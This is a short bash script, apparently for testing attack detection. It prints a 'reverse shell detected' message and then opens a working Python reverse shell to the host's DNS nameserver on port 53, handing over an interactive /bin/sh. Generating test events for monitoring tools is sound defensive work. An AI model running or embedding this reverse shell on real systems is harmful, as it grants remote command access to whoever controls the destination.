#!/bin/bash

echo -e `date +"%Y-%m-%d %H:%M:%S"` "\e[92mReverse shell detected with process sh and parent python under user root\033[m"
export NS=`grep nameserver /etc/resolv.conf|awk '{print $2}'`
python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$NS',53));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"
